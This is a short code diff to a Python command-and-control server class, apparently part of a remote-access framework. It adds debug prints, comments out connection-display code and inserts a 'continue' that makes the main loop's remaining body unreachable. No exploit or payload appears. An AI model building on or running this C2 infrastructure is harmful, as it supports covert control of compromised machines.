@@ -1005,28 +1005,27 @@ class C2():
         while True:
             print('connecting')
             connection, address = self.socket.accept()
-            session = Session(connection=connection, id=self._count) # hanging here
+            print('after accept. creating session')
+            session = Session(connection=connection, id=self._count)
             print('b4 if')
             if session.info != None:
                 info = self.database.handle_session(session.info)
                 print('after handle')
                 if isinstance(info, dict):
                     self._count += 1
-                    if info.pop('new', False):
-                        util.display("\n\n[+]", color='green', style='bright', end=' ')
-                        util.display("New Connection:", color='white', style='bright', end=' ')
-                    else:
-                        util.display("\n\n[+]", color='green', style='bright', end=' ')
-                        util.display("Connection:", color='white', style='bright', end=' ')
-                    print('before display')
-                    util.display(address[0], color='white', style='normal')
-                    util.display("    Session:", color='white', style='bright', end=' ')
-                    util.display(str(session.id), color='white', style='normal')
-                    util.display("    Started:", color='white', style='bright', end=' ')
-                    util.display(time.ctime(session._created), color='white', style='normal')
+                    # if info.pop('new', False):
+                    #     util.display("\n\n[+]", color='green', style='bright', end=' ')
+                    #     util.display("New Connection:", color='white', style='bright', end=' ')
+                    # else:
+                    #     util.display("\n\n[+]", color='green', style='bright', end=' ')
+                    #     util.display("Connection:", color='white', style='bright', end=' ')
+                    print('before displays')
+                    # util.display(address[0], color='white', style='normal')
+                    # util.display("    Session:", color='white', style='bright', end=' ')
+                    # util.display(str(session.id), color='white', style='normal')
+                    # util.display("    Started:", color='white', style='bright', end=' ')
+                    # util.display(time.ctime(session._created), color='white', style='normal')
                     session.info = info
-
-                    print('after out')
 
                     print('creating sockets')
                     self.sessions[int(session.id)] = session
@@ -1205,6 +1204,7 @@ class C2():
             globals()['__threads']['c2'] = self.serve_until_stopped()
             globals()['__threads']['c2-unix'] = self.serve_unix_sockets()
         while True:
+            continue
             try:
                 # Wait for events to stop before continuing (ie current session)
                 self._active.wait()
@@ -1267,6 +1267,7 @@ class Session(threading.Thread):
         :param int id:      session ID
 
         """
+        print('session var init')
         super(Session, self).__init__()
         self._prompt = None
         self._abort = False
@@ -1278,9 +1279,12 @@ class Session(threading.Thread):
         self.key = security.diffiehellman(self.connection)
         # self.rsa = security.Crypto.PublicKey.RSA.generate(2048)
 
+        print('rsa generate')
+
         # from Crypto.PublicKey import RSA
         # self.rsa = RSA.generate(2048)
 
+        print('getting client info')
         try:
             self.info = self.client_info()
             #self.info['id'] = self.id
